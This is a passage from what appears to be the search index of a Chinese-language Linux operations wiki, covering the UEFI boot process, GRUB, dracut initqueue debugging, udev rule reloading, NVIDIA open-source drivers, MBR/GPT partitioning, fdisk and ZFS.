<p>\u5bf9\u5e94\u5230 Linux \u7cfb\u7edf\uff0c\u6211\u4eec\u719f\u6089\u7684 GRUB \u5c31\u662f\u5728 BDS \u9636\u6bb5\u52a0\u8f7d\u7684\u3002<code>/boot/efi</code> \u4e00\u822c\u6302\u8f7d\u4e3a EFI \u5206\u533a\uff0c\u53ef\u4ee5\u5728\u5176\u4e2d\u627e\u5230 grub \u7684 EFI \u6587\u4ef6\u3002</p> <pre><code>$ duf\n\u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e\n\u2502 2 local devices                                                                                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 MOUNTED ON \u2502   SIZE \u2502   USED \u2502  AVAIL \u2502              USE%             \u2502 TYPE  \u2502 FILESYSTEM     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 /          \u2502 464.3G \u2502 278.8G \u2502 183.1G \u2502 [############........]  60.0% \u2502 btrfs \u2502 /dev/nvme1n1p2 \u2502\n\u2502 /boot/efi  \u2502 511.0M \u2502   4.4M \u2502 506.6M \u2502 [....................]   0.9% \u2502 vfat  \u2502 /dev/nvme1n1p1 \u2502\n\u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f\n$ ls /boot/efi/EFI/debian\nBOOTX64.CSV  fbx64.efi  grub.cfg  grubx64.efi  mmx64.efi  shimx64.efi\n</code></pre> <p>\u800c\u5bf9\u4e8e PXE \u542f\u52a8\uff0c\u5e94\u8be5\u5728 DXE \u9636\u6bb5\u521d\u59cb\u5316\u7f51\u7edc\u8bbe\u5907\uff0c\u7136\u540e\u5728 BDS \u9636\u6bb5\u9009\u62e9\u7f51\u7edc\u8bbe\u5907\u542f\u52a8\uff0c\u7531\u7f51\u7edc\u8bbe\u5907\u56fa\u4ef6\u63d0\u4f9b\u7684 UEFI \u670d\u52a1\u83b7\u53d6 PXE \u5f15\u5bfc\u7a0b\u5e8f\uff0c\u5982 pxelinux \u6216 iPXE\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/boot/#\u5f15\u5bfc\u7a0b\u5e8f-grub2","title":"\u5f15\u5bfc\u7a0b\u5e8f <code>grub2</code>","text":"<p>Quote</p> <ul> <li>GNU GRUB Manual 2.12</li> <li>\u57fa\u4e8e Grub 2.00 \u7684 x86 \u5185\u6838\u5f15\u5bfc\u6d41\u7a0b--\u6e90\u4ee3\u7801\u60c5\u666f\u5206\u6790\uff082\uff09 - \u77e5\u4e4e</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/boot/#\u5185\u6838\u542f\u52a8\u53c2\u6570","title":"\u5185\u6838\u542f\u52a8\u53c2\u6570","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/boot/#initramfs-\u9636\u6bb5","title":"initramfs \u9636\u6bb5","text":"<pre><code>- [Debian Wiki: BootProcess](https://wiki.debian.org/BootProcess)\n- [Debian Reference: Chapter 3. The system initialization](https://www.debian.org/doc/manuals/debian-reference/ch03.en.html)\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/boot/#dracut","title":"dracut","text":"<p>\u542f\u52a8\u8fc7\u7a0b\u4e2d\u9047\u5230 dracut initqueue timeout \u7b49\u95ee\u9898\uff0c\u5982\u4f55\u8c03\u8bd5\uff1f\u6211\u4eec\u9700\u8981\u4e86\u89e3 dracut \u7684\u57fa\u672c\u5de5\u4f5c\u539f\u7406\u3002</p> <p>dracut \u662f\u6a21\u5757\u5316\u7684 initramfs \u5de5\u5177\u3002\u53ef\u4ee5\u5728 <code>/usr/lib/dracut/modules.d/</code> \u4e2d\u627e\u5230\u5404\u79cd\u6a21\u5757\uff0c\u5982 <code>95nfs</code>\u3001<code>95iscsi</code> \u7b49\u3002\u6bcf\u4e2a\u6a21\u5757\u7684\u6587\u4ef6\u5939\u4e0b\u90fd\u81f3\u5c11\u6709\u4e00\u4e2a <code>module-setup.sh</code> \u6587\u4ef6\u3002\u751f\u6210 initramfs \u65f6\uff0c\u5b83\u6267\u884c\u8be5\u6587\u4ef6\u4e2d\u7684 <code>check()</code>\u3001<code>install()</code>\u3001<code>installkernel()</code> \u7b49\u51fd\u6570\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u6253\u5305\u6210 initramfs\u3002\u4ee5 <code>nfs</code> \u6a21\u5757\u4e3a\u4f8b\uff0c\u5b83\u7684\uff1a</p> <ul> <li><code>check()</code> \u51fd\u6570\u68c0\u67e5\u4e86\u5fc5\u8981\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u662f\u5426\u5b58\u5728\u3002</li> <li><code>install()</code> \u51fd\u6570\u62f7\u8d1d\u4e86\u4e00\u4e9b\u6587\u4ef6\u5230 initramfs\uff0c\u5e76\u5728\u542f\u52a8\u8fc7\u7a0b\u4e2d\u7684\u51e0\u4e2a Hook \u70b9\u6ce8\u518c\u81ea\u5b9a\u4e49\u811a\u672c\u3002</li> </ul> dracut/modules.d/95nfs/module-setup.sh<pre><code>check() {\n    require_any_binary rpcbind portmap || return 1\n    # ...\n}\ninstall() {\n    # ...\n    inst_hook cmdline 90 \"$moddir/parse-nfsroot.sh\"\n    inst_hook pre-udev 99 \"$moddir/nfs-start-rpc.sh\"\n    inst_hook cleanup 99 \"$moddir/nfsroot-cleanup.sh\"\n    # ...\n    mkdir -m 0755 -p \"$initdir/var/lib/nfs\"\n}\n</code></pre> <p>dracut \u542f\u52a8\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ul> <li>Hook: cmdline</li> <li>Hook: pre-udev</li> <li>Start Udev</li> <li>Hook: pre-trigger</li> <li>Trigger Udev</li> <li>Main Loop<ul> <li>Initqueue</li> <li>Initqueue settled</li> <li>Initqueue timeout</li> <li>Initqueue online</li> <li>Initqueue finished\uff1a\u5728 udev \u7a33\u5b9a\u540e\u88ab\u8c03\u7528\uff0c\u5982\u679c\u8fd9\u91cc\u7684\u6240\u6709\u811a\u672c\u90fd\u8fd4\u56de 0\uff0c\u4e3b\u5faa\u73af\u5c06\u7ed3\u675f\u3002\u53ef\u4ee5\u5728\u8fd9\u91cc\u6dfb\u52a0\u4efb\u610f\u811a\u672c\uff0c\u4ee5\u4fbf\u5728 initqueue \u4e2d\u5faa\u73af\uff0c\u76f4\u5230\u53d1\u751f\u67d0\u4e9b dracut \u6a21\u5757\u9700\u8981\u7b49\u5f85\u7684\u4e8b\u60c5\u3002</li> </ul> </li> <li>Hook: pre-mount</li> <li>Hook: mount</li> <li>Hook: pre-pivot</li> <li>Hook: cleanup</li> <li>Cleanup and switch_root\uff1achroot \u5230\u771f\u6b63\u7684\u6839\u76ee\u5f55\uff0c\u7136\u540e\u6267\u884c\u771f\u6b63\u7684 init \u7a0b\u5e8f <code>/sbin/init</code>\u3002</li> </ul> <p>\u4ee5 <code>nfs</code> \u6a21\u5757\u4e3a\u4f8b\uff0c\u6211\u4eec\u77e5\u9053 <code>parse-nfsroot.sh</code> \u5728 Hook:cmdline \u6267\u884c\u3002\u5b83\u5c06\u4e00\u4e2a\u64cd\u4f5c\u6ce8\u518c\u5230\u4e86 Initqueue finished\uff1a</p> dracut/modules.d/95nfs/parse-nfsroot.sh<pre><code>echo '[ -e $NEWROOT/proc ]' &gt; \"$hookdir\"/initqueue/finished/nfsroot.sh\n</code></pre> <p>\u610f\u56fe\u662f\u901a\u8fc7\u68c0\u67e5 <code>/proc</code> \u662f\u5426\u5b58\u5728\u6765\u5224\u65ad NFS \u6839\u76ee\u5f55\u662f\u5426\u6302\u8f7d\u6210\u529f\u3002\u5982\u679c\u5728\u542f\u52a8\u8fc7\u7a0b\u4e2d\u9047\u5230\u8fd9\u6837\u7684\u62a5\u9519\uff1a</p> <pre><code>dracut-initqueue[123]: Warning: dracut-initqueue timeout - still waiting for following initqueue hooks:\niniqueue/finished/nfsroot.sh: \"[ -e $NEWROOT/proc ]\"\n</code></pre> <p>\u5c31\u53ef\u4ee5\u77e5\u9053 NFS \u6839\u76ee\u5f55\u6302\u8f7d\u5931\u8d25\u4e86\u3002NFS \u6302\u8f7d\u5931\u8d25\u7684\u539f\u56e0\u53ef\u80fd\u662f\u7f51\u7edc\u95ee\u9898\u3001NFS \u670d\u52a1\u5668\u95ee\u9898\u7b49\uff0c\u53ef\u4ee5\u9010\u4e00\u6392\u67e5\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/boot/#arm-\u67b6\u6784","title":"ARM \u67b6\u6784","text":"<p>Quote</p> <ul> <li>What is the booting process for ARM? - Stack Overflow</li> <li>ELI5: Is there any good reason why ARM systems can't use something like ACPI+UEFI to eliminate the need for device tree (DTB) files and open easier, wider OS compatibility on ARM systems? : r/hardware</li> </ul> <p>\u4e0e x86 \u67b6\u6784\u4e0d\u540c\uff0c\u5927\u90e8\u5206 ARM \u67b6\u6784\u7684\u786c\u4ef6\u8bbe\u5907\u4e0d\u652f\u6301 ACPI + UEFI\uff0c\u800c\u662f\u4f7f\u7528 Device Tree Blob\uff08DTB\uff09\u6587\u4ef6\u6765\u63cf\u8ff0\u786c\u4ef6\u8bbe\u5907\u3002\u867d\u7136\u76ee\u524d\u6709\u652f\u6301 UEFI \u7684\u5de5\u4f5c\uff08\u89c1 It is so disappointing that ARM and RISC-V is adopting UEFI - Hacker News\uff09\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/drivers/","title":"Linux \u8bbe\u5907\u9a71\u52a8","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/drivers/#linux-\u8bbe\u5907\u9a71\u52a8","title":"Linux \u8bbe\u5907\u9a71\u52a8","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/drivers/#udev","title":"udev","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/drivers/#\u91cd\u8f7d-udev-rules","title":"\u91cd\u8f7d udev rules","text":"<p>Quote</p> <ul> <li>udevadm - freedesktop</li> <li>kernel - How to reload udev rules without reboot? - Unix &amp; Linux Stack Exchange</li> </ul> <p>\u6784\u5efa\u65e0\u76d8\u7cfb\u7edf\u65f6\uff0c\u90e8\u5206\u9a71\u52a8\uff08\u5982 DOCA\uff09\u53ef\u80fd\u5728 <code>.postinst</code> \u811a\u672c\u4e2d\u91cd\u8f7d udev rules\uff1a</p> rdma-core.postinst<pre><code>if [ \"$1\" = \"configure\" ]; then\n    # we ship udev rules, so trigger an update. This has to be done after\n    # DEBHELPER restarts systemd to get our new service files loaded.\n    udevadm trigger --subsystem-match=infiniband --action=change || true\n    udevadm trigger --subsystem-match=net --action=change || true\n    udevadm trigger --subsystem-match=infiniband_mad --action=change || true\nfi\n</code></pre> <p>\u4f46\u662f\u7531\u4e8e\u65e0\u76d8\u7cfb\u7edf\u6784\u5efa\u5904\u4e8e <code>systemd-nspawn</code> \u73af\u5883\uff0c<code>uevent</code> \u6587\u4ef6\u53ea\u8bfb\uff1a</p> <pre><code>Setting up rdma-core (2410mlnx54-1.2410068) ...\n[0;1;31mibp1s0: Failed to write 'change' to '/sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0/infiniband/ibp1s0/uevent': Read-only file system[0m\n\n[0;1;31mibs10: Failed to write 'change' to '/sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0/net/ibs10/uevent': Read-only file system[0m\n\n[0;1;31missm2: Failed to write 'change' to '/sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0/infiniband_mad/issm2/uevent': Read-only file system[0m\n</code></pre> <p>Question</p> <p>\u4e3a\u4ec0\u4e48 <code>uevent</code> \u6587\u4ef6\u53ea\u8bfb\uff0c\u662f\u56e0\u4e3a\u5bb9\u5668\u5185 <code>systemd-udevd</code> \u670d\u52a1\u6ca1\u542f\u52a8\u5417\uff1f\u5982\u679c\u4f7f\u7528 <code>init</code> \u542f\u52a8\u5b8c\u6574\u5bb9\u5668\uff0c\u662f\u5426\u4ecd\u4f1a\u5b58\u5728\u95ee\u9898\uff1f</p> <p>\u5728\u6784\u5efa\u8fc7\u7a0b\u4e2d\u8fd9\u4e00\u9519\u8bef\u5e76\u4e0d\u91cd\u8981\uff0c\u53ea\u662f\u76f8\u5f53\u4e8e\u63d2\u62d4\u4e86\u4e00\u6b21\u8bbe\u5907\uff0c\u4e0d\u5f71\u54cd udev rules \u5e94\u7528\u5230\u540e\u7eed\u7684\u7269\u7406\u673a\u542f\u52a8\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/drivers/#nvidia-gpu","title":"NVIDIA GPU","text":"<p>Quote</p> <ul> <li>NVIDIA Transitions Fully Towards Open-Source GPU Kernel Modules - NVIDIA Technical Blog</li> </ul> <p>\u76ee\u524d\uff0cNVIDIA \u5df2\u7ecf\u5168\u9762\u8f6c\u5411\u5f00\u6e90 GPU \u5185\u6838\u6a21\u5757\uff0c\u8fd9\u5bf9\u4e8e\u6211\u4eec\u7684\u96c6\u7fa4\u8fd0\u7ef4\u6765\u8bf4\u662f\u4e00\u4e2a\u597d\u6d88\u606f\u3002NVIDIA \u5efa\u8bae\u4ece Turing \u67b6\u6784\u5f00\u59cb\u4f7f\u7528\u5f00\u6e90\u9a71\u52a8\uff0c\u6211\u4eec\u7684\u6700\u4f4e\u663e\u5361 2080Ti \u6b63\u662f Turing \u67b6\u6784\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u653e\u5fc3\u5730\u8fc1\u79fb\u5230\u5f00\u6e90\u9a71\u52a8\u3002\u4f7f\u7528\u5305\u7ba1\u7406\u5668\u5b89\u88c5 <code>cuda</code> \u65f6\uff0c\u4f1a\u81ea\u52a8\u5b89\u88c5\u76f8\u5173\u8054\u7248\u672c\u7684\u9a71\u52a8\u3002CUDA 12.5 \u53ca\u4ee5\u524d\u4e3a\u95ed\u6e90\u9a71\u52a8\uff0cCUDA 12.6 \u53ca\u4ee5\u540e\u4e3a\u5f00\u6e90\u9a71\u52a8\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/","title":"\u6587\u4ef6\u7cfb\u7edf","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u6587\u4ef6\u7cfb\u7edf","title":"\u6587\u4ef6\u7cfb\u7edf","text":"<p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\uff0c\u9664\u53bb\u8ba1\u7b97\uff0c\u6700\u91cd\u8981\u7684\u90e8\u5206\u83ab\u8fc7\u4e8e\u5b58\u50a8\u3002\u672c\u6587\u4ecb\u7ecd\u8fd0\u7ef4\u4e2d\u5e38\u7528\u7684\u5b58\u50a8\u76f8\u5173\u7684\u77e5\u8bc6\u548c\u6280\u80fd\u3002\u5bf9\u5176\u80cc\u540e\u7684\u539f\u7406\u4e0d\u4f1a\u6df1\u5165\u8ba8\u8bba\uff0c\u53ef\u4ee5\u53c2\u8003\u76f8\u5173\u6587\u732e\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u78c1\u76d8\u539f\u7406","title":"\u78c1\u76d8\u539f\u7406","text":"<p>\u672c\u8282\u89e3\u91ca\u6587\u4ef6\u7cfb\u7edf\u4e0b\u5c42\u7684\u4e00\u4e9b\u6982\u5ff5\uff0c\u5305\u62ec\u5206\u533a\u3001\u903b\u8f91\u5377\u7b49\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u78c1\u76d8\u7ed3\u6784","title":"\u78c1\u76d8\u7ed3\u6784","text":"<p>\u4ece 1986 \u5e74\u5f00\u59cb\uff0c\u78c1\u76d8\u7684\u51e0\u4f55\u7ed3\u6784\u5f00\u59cb\u7ecf\u5386\u4ece CHS\uff08Cylinder-Head-Sector\uff09\u5230 LBA\uff08Logical Block Addressing\uff09\u7684\u8f6c\u53d8\u3002\u66fe\u51e0\u4f55\u65f6\uff0c\u78c1\u76d8\u7684\u51e0\u4f55\u7ed3\u6784\u662f\u7531 CHS \u4e09\u5143\u7ec4\uff08\u67f1\u9762\u3001\u78c1\u5934\u3001\u6247\u533a\uff09\u63cf\u8ff0\u7684\u3002\u4f46\u968f\u7740\u78c1\u76d8\u6280\u672f\u7684\u53d1\u5c55\uff0c\u5177\u4f53\u7684\u7269\u7406\u7ed3\u6784\u9010\u6e10\u88ab\u9690\u85cf\uff0c\u8f6c\u800c\u91c7\u7528\u903b\u8f91\u4e0a\u8fde\u7eed\u7684 Block \u6765\u5bfb\u5740\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u5206\u533a\u8868","title":"\u5206\u533a\u8868","text":"<p>\u78c1\u76d8\u53ef\u4ee5\u5206\u533a\uff0c\u4ee5\u4fbf\u5efa\u7acb\u66f4\u591a\u533a\u57df\u5206\u522b\u7ba1\u7406\u3002\u5bf9\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u6765\u8bf4\uff0c\u5206\u533a\u662f\u903b\u8f91\u4e0a\u72ec\u7acb\u7684\u8bbe\u5907\u3002</p> <p>\u78c1\u76d8\u4e0a\u5b58\u50a8\u5206\u533a\u8868\u4ee5\u8bb0\u5f55\u5206\u533a\u4fe1\u606f\u3002\u64cd\u4f5c\u7cfb\u7edf\u5728\u8bfb\u53d6\u78c1\u76d8\u65f6\u5148\u8bfb\u53d6\u5206\u533a\u8868\uff0c\u7136\u540e\u6839\u636e\u5206\u533a\u8868\u7684\u4fe1\u606f\u8bfb\u53d6\u5404\u4e2a\u5206\u533a\u3002\u5206\u533a\u8868\u6709\u4e24\u79cd\u683c\u5f0f\uff1aMBR \u548c GPT\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#mbr","title":"MBR","text":"<p>Quote</p> <ul> <li>Master boot record - Wikipedia</li> </ul> <p>\u4e3b\u5f15\u5bfc\u8bb0\u5f55\uff08Master Boot Record\uff0cMBR\uff09\u5305\u542b\u78c1\u76d8\u5206\u533a\u4fe1\u606f\uff0c\u4ee5\u53ca\u4e00\u6bb5\u7528\u4e8e\u5f15\u5bfc\u64cd\u4f5c\u7cfb\u7edf\u7684\u4ee3\u7801\u3002\u56e0\u6b64\uff0c\u5728\u8c08\u8bba\u5206\u533a\u8868\u6216\u5f15\u5bfc\u7a0b\u5e8f\u65f6\u90fd\u53ef\u80fd\u63d0\u53ca MBR\u3002</p> <p>MBR \u51fa\u73b0\u8f83\u65e9\u3002\u5b83\u7531\u78c1\u76d8\u4e0a\u7b2c\u4e00\u4e2a\u6247\u533a\u7684 512 \u5b57\u8282\u7ec4\u6210\u3002\u8fd9\u6837\u7684\u9650\u5236\u5bfc\u81f4 MBR \u4ec5\u80fd\u7ba1\u7406 2TB \u4ee5\u4e0b\u7684\u78c1\u76d8\uff0c\u53ea\u652f\u6301 4 \u4e2a\u5206\u533a\u3002MBR \u9010\u6e10\u88ab GPT \u53d6\u4ee3\u3002</p> MBR \u5206\u533a\u8868\u7ed3\u6784 MBR (Master Boot Record) explained - IONOS CA","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#gpt","title":"GPT","text":"<p>Quote</p> <ul> <li>GUID Partition Table - Wikipedia</li> </ul> <p>GUID \u5206\u533a\u8868\uff08GUID Partition Table\uff0cGPT\uff09\u662f UEFI \u6807\u51c6\u7684\u4e00\u90e8\u5206\u3002GPT \u91c7\u7528 64 \u4f4d\u7684 LBA\uff08Logical Block Addressing\uff09\u6765\u5bfb\u5740\uff0c\u56e0\u6b64\u652f\u6301\u66f4\u5927\u7684\u78c1\u76d8\u3002GPT \u517c\u5bb9 MBR\uff1a</p> <ul> <li>LBA 0 \u4e3a MBR</li> <li>\u63a5\u4e0b\u6765\u662f GPT \u5934</li> <li>\u78c1\u76d8\u672b\u5c3e\u662f\u5907\u4efd\u7684 GPT \u5934</li> </ul> <p>GPT \u5206\u533a\u8868\u7684\u6bcf\u4e2a\u8868\u9879\u4e3a 128 \u5b57\u8282\uff0c\u6807\u51c6\u89c4\u5b9a\u81f3\u5c11 16,384 \u5b57\u8282\u7528\u4e8e\u8868\u9879\u6570\u7ec4\uff0c\u5373\u81f3\u5c11\u652f\u6301 128 \u4e2a\u5206\u533a\u3002\u5728\u6247\u533a\u5927\u5c0f\u4e3a 512 \u5b57\u8282\u7684\u60c5\u51b5\u4e0b\uff0cGPT \u5206\u533a\u8868\u5360\u7528\u81f3\u5c11 32 \u4e2a\u6247\u533a\uff0c\u6545\u7b2c\u4e00\u4e2a\u53ef\u7528\u7684 LBA \u4e3a 34\u3002</p> GPT \u5206\u533a\u8868\u7ed3\u6784 GUID Partition Table information - Thomas-Krenn-Wiki-en <p>GPT \u8868\u9879\u5305\u542b\u5982\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>\u4e24\u79cd GUID\uff1a\u5206\u533a\u7c7b\u578b GUID \u548c\u552f\u4e00\u5206\u533a GUID\u3002\u5206\u533a\u7c7b\u578b GUID \u7528\u4e8e\u6807\u8bc6\u5206\u533a\u7c7b\u578b\uff0c\u552f\u4e00\u5206\u533a GUID \u7528\u4e8e\u6807\u8bc6\u5206\u533a\u3002</li> <li>\u5206\u533a\u7684\u8d77\u59cb\u548c\u7ed3\u675f LBA\u3002</li> <li>\u5206\u533a\u5c5e\u6027\uff1a\u5982\u53ea\u8bfb\u3001\u9690\u85cf\u7b49\u3002\u6709\u4e9b\u5c5e\u6027\u901a\u7528\uff0c\u6709\u4e9b\u5c5e\u6027\u5bf9\u7279\u5b9a\u6587\u4ef6\u7cfb\u7edf\u3001\u64cd\u4f5c\u7cfb\u7edf\u6709\u6548\u3002</li> <li>\u5206\u533a\u540d\u79f0\u3002</li> </ul> <p>\u8981\u4f7f\u7528 UEFI\uff0cGPT \u78c1\u76d8\u4e2d\u81f3\u5c11\u9700\u8981\u4e00\u4e2a EFI \u7cfb\u7edf\u5206\u533a\uff08EFI System Partition\uff0cESP\uff09\u3002UEFI \u53ef\u4ee5\u8bc6\u522b\u5b83\u5e76\u8bfb\u53d6\u5668\u4e2d\u7684 FAT \u6587\u4ef6\u7cfb\u7edf\uff0c\u5728\u5176\u4e2d\u5bfb\u627e\u5f15\u5bfc\u6587\u4ef6\u3002</p> <p>Note</p> <p>\u4e0e Legacy + MBR \u542f\u52a8\u65b9\u5f0f\u4e0b\u6bcf\u4e2a\u7cfb\u7edf\u9700\u8981\u5177\u6709\u4e00\u4e2a\u72ec\u7acb\u7684 /boot \u5206\u533a\u4e0d\u540c\uff0c\u5728 UEFI + GPT \u542f\u52a8\u65b9\u5f0f\u4e0b\uff0c\u4e00\u4e2a\u78c1\u76d8\u4e0a\u6240\u6709\u7cfb\u7edf\u5171\u4eab ESP\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u903b\u8f91\u5377","title":"\u903b\u8f91\u5377","text":"<p>Quote</p> <ul> <li>Enterprise Linux \u5be6\u6230\u8b1b\u5ea7 Logical Volume Manager (\u4e00) - \u9e1f\u54e5\u7684\u9996\u9875</li> </ul> <p>\u76ee\u524d\u6211\u4eec\u6ca1\u6709\u4f7f\u7528\u8be5\u529f\u80fd\uff0c\u7565\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u78c1\u76d8\u5b9e\u8df5","title":"\u78c1\u76d8\u5b9e\u8df5","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#fdisk","title":"<code>fdisk</code>","text":"<p><code>fdisk</code> \u662f <code>util-linux</code> \u7684\u4e00\u90e8\u5206\uff0c\u7528\u4e8e\u78c1\u76d8\u5206\u533a\u3002\u8be5\u547d\u4ee4\u540e\u63a5\u4e00\u4e2a\u78c1\u76d8\u8bbe\u5907\u6587\u4ef6\u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f\uff1a</p> <pre><code>$ sudo fdisk /dev/sda\nChanges will remain in memory only, until you decide to write them.\nBe careful before using the write command.\n\nCommand (m for help):\n</code></pre> <p>\u5728\u4ea4\u4e92\u6a21\u5f0f\u4e0b\u6309\u7167\u6307\u5f15\u8fdb\u884c\u64cd\u4f5c\u3002\u64cd\u4f5c\u4f1a\u5728\u5185\u5b58\u4e2d\u4fdd\u5b58\uff0c\u76f4\u5230\u4f7f\u7528 <code>w</code> \u5199\u5165\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#\u6587\u4ef6\u7cfb\u7edf\u539f\u7406","title":"\u6587\u4ef6\u7cfb\u7edf\u539f\u7406","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"operation/system/basic/filesystem/#zfs","title":"ZFS","text":"<p>Quote</p> <ul> <li>ZFS \u5206\u5c64\u67b6\u69cb\u8a2d\u8a08 - Farseerfc \u7684\u5c0f\u7aa9\uff1a\u5173\u4e8e ZFS \u539f\u7406\u7684\u5168\u9762\u7684\u7d22\u5f15\uff0c\u7ed9\u51fa\u4e86\u975e\u5e38\u591a\u7684\u53c2\u8003\u8d44\u6599\u548c\u89c6\u9891\u94fe\u63a5\u3002</li> <li>Oracle ZFS</li> <li>OpenZFS</li> </ul> <ul> <li>\u4f7f\u7528\u60c5\u51b5\uff1a\u76ee\u524d\u6211\u4eec\u4e3b\u8981\u5728\u5b58\u50a8\u6c60\u4f7f\u7528 ZFS\u3002ZFS \u9002\u7528\u4e8e\u78c1\u76d8\u9635\u5217\u548c\u5927\u5bb9\u91cf\u5b58\u50a8\uff0c\u63d0\u4f9b\u4e86\u5f3a\u5927\u7684\u6570\u636e\u4fdd\u62a4\u80fd\u529b\u548c\u9ad8\u7ea7\u7ba1\u7406\u529f\u80fd\u3002</li> <li>\u5386\u53f2\uff1aZFS \u7531 Sun \u516c\u53f8\u5f00\u53d1\uff0c\u968f\u7740 OpenSolaris \u5f00\u6e90\u3002\u5f53 Oracle \u6536\u8d2d Sun \u540e\uff0cZFS \u8f6c\u4e3a\u95ed\u6e90\u3002ZFS \u7684\u5f00\u6e90\u5206\u652f\u4ece OpenSolaris \u6d3e\u751f\u800c\u6765\uff0c\u73b0\u7531 OpenZFS \u7ef4\u62a4\u3002</li> <li>\u53d1\u5c55\u60c5\u51b5\uff1aZFS \u73b0\u6709\u4e24\u79cd\u5b9e\u73b0\uff0c\u4e00\u79cd\u662f OpenZFS\uff08\u5927\u591a\u6570\u4eba\u4f7f\u7528\u7684\uff09\uff0c\u4e00\u79cd\u662f\u5411 Oracle 